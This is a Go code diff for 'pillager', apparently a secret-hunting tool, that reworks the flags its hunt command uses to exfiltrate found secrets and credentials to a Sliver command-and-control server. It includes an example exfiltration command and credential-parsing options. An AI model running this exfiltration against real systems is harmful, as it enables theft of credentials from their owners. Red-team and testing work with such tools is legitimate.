@@ -47,7 +47,6 @@ var (
 
 	// Sliver C2 flags
 	sliverConfig     string
-	sliverSession    string
 	sliverLootName   string
 	sliverLootType   string
 	sliverParseCreds bool
@@ -75,7 +74,7 @@ var huntCmd = &cobra.Command{
 		pillager hunt . --template "{{ range .}}Secret: {{.Secret}}{{end}}"
 
 	Exfiltrate to Sliver C2:
-		pillager hunt . --exfil sliver --sliver-config ~/.sliver-client/configs/operator.cfg --sliver-session <session-id>
+		pillager hunt . --exfil sliver --sliver-config ~/.sliver-client/configs/operator.cfg
 `,
 	RunE: func(cmd *cobra.Command, args []string) error {
 		opts, err := setupConfig()
@@ -168,7 +167,6 @@ func exfiltrateFindings(findings []pillager.Finding) error {
 	case "sliver":
 		cfg.Sliver = &exfil.SliverOptions{
 			ConfigPath:       sliverConfig,
-			SessionID:        &sliverSession,
 			LootName:         &sliverLootName,
 			LootType:         &sliverLootType,
 			ParseCredentials: &sliverParseCreds,
@@ -229,9 +227,8 @@ func init() {
 
 	// Sliver C2 flags
 	huntCmd.Flags().StringVar(&sliverConfig, "sliver-config", "", "path to Sliver operator config file (e.g., ~/.sliver-client/configs/operator.cfg)")
-	huntCmd.Flags().StringVar(&sliverSession, "sliver-session", "", "Sliver session/beacon ID to associate findings with")
 	huntCmd.Flags().StringVar(&sliverLootName, "sliver-loot-name", "pillager-scan", "prefix for loot item names in Sliver")
-	huntCmd.Flags().StringVar(&sliverLootType, "sliver-loot-type", "credentials", "type of loot to store in Sliver")
+	huntCmd.Flags().StringVar(&sliverLootType, "sliver-loot-type", "file", "loot type for findings file (file, credential/credentials)")
 	huntCmd.Flags().BoolVar(&sliverParseCreds, "sliver-parse-creds", true, "parse and store credentials in Sliver's credential store")
 
 	// Bind flags to viper
